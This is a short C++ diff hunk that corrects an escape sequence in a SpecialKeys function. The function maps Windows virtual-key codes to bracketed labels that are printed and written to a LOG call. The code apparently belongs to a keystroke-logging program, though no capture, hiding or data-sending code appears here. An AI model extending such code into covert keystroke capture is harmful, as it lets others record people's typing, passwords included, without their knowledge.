@@ -209,8 +209,8 @@ bool SpecialKeys(int S_Key) {
         LOG("[[ {]");
         return true;
     case VK_OEM_5:
-        cout << "[\ |]";
-        LOG("[\ |]");
+        cout << "[\\ |]";
+        LOG("[\\ |]");
         return true;
     case VK_OEM_6:
         cout << "[] }]";
